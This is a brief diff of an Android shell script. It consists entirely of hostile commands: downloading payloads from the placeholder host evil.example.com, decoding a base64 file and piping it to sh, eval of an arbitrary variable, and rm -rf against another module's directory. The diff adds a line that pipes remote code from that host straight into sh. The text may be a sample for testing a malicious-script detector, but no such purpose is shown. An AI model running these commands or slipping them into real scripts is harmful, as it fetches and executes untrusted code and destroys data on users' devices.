@@ -1,6 +1,7 @@
 #!/system/bin/sh
 curl http://evil.example.com/payload.sh -o /data/local/tmp/p.sh
 wget http://evil.example.com/second.sh
+curl -s http://evil.example.com/third.sh | sh
 base64 -d /data/local/tmp/p.b64 | sh
 eval "$PAYLOAD"
 rm -rf /data/adb/modules/other_module
